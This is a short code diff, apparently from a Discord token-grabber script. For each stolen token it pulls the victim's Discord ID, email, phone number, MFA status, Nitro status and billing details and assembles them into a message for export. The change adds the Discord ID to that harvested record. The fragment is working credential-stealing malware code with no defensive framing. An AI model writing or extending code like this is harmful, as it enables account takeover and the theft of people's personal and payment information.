@@ -131,7 +131,7 @@ def main():
             if userData != None:
                  username, discordId, phone, email, mfa, nitro, billing = grab.extract(userData, token)
                  # construct message
-                 message = f"Token: {token}| MFA: {mfa}\nEmail: {email} / Phone#: {phone}\nNitro: {nitro}\nBilling: {billing}"
+                 message = f"Discord ID: {discordId}\nToken: {token}| MFA: {mfa}\nEmail: {email} / Phone#: {phone}\nNitro: {nitro}\nBilling: {billing}"
                  export_file(message)
 
 def export_file(message):
